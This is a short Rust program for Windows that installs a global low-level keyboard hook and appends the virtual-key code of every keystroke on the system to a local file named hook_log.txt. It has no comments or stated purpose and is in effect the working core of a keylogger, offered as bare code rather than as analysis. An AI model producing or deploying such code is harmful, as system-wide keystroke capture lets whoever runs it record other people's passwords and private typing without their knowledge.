use std::fs::OpenOptions;
use std::io::Write;
use windows::Win32::Foundation::{LPARAM, LRESULT, WPARAM};
use windows::Win32::UI::WindowsAndMessaging::{
    CallNextHookEx, DispatchMessageW, GetMessageW, SetWindowsHookExW, TranslateMessage, MSG,
    WH_KEYBOARD_LL, HHOOK, KBDLLHOOKSTRUCT, WM_KEYUP, WM_SYSKEYUP
};
use windows::Win32::System::LibraryLoader::GetModuleHandleW;

unsafe extern "system" fn hook_proc(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 {
        let kb = *(lparam.0 as *const KBDLLHOOKSTRUCT);
        if let Ok(mut file) = OpenOptions::new().create(true).append(true).open("hook_log.txt") {
            let _ = writeln!(file, "EVENT: vk={}", kb.vkCode);
        }
    }
    CallNextHookEx(HHOOK::default(), code, wparam, lparam)
}

fn main() {
    unsafe {
        let h_mod = GetModuleHandleW(None).unwrap_or_default();
        let hook = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(hook_proc),
            h_mod,
            0,
        );
        
        if hook.is_ok() {
            if let Ok(mut file) = OpenOptions::new().create(true).append(true).open("hook_log.txt") {
                let _ = writeln!(file, "Hook with h_mod installed!");
            }
        }
        
        let mut msg: MSG = MSG::default();
        while GetMessageW(&mut msg, None, 0, 0).as_bool() {
            let _ = TranslateMessage(&msg);
            let _ = DispatchMessageW(&msg);
        }
    }
}
